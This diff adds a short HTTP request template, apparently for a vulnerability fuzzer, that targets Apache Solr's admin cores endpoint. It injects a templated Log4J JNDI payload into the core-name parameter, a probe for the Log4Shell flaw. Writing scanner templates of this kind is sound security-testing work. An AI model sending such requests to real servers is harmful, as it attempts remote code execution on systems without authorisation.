@@ -1,0 +1,4 @@
+GET /solr/admin/cores?action=CREATE&wt=json&name={{ .Fuzzer.PayloadJNDILog4J .Url.String "solr-create-core-name" }} HTTP/1.1
+Host: {{ .Url.Hostname }}:{{ .Url.Port }}
+User-Agent: l9fuzz
+
